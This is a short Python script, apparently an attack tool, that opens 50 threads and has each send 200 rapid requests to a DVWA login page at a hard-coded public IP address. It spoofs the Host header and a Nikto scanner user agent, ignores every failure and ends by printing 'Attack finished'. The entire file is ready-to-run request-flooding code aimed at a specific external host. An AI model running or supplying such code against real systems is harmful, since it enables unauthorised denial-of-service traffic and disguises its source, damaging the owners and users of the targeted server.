import urllib.request
import threading
import time

def attack():
    for i in range(200):
        try:
            req = urllib.request.Request(f"http://54.82.224.174/dvwa/login.php?p={i}")
            req.add_header('Host', '54.82.224.174.nip.io')
            req.add_header('User-Agent', 'Nikto/2.1.6')
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass

threads = []
for _ in range(50):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Attack finished")
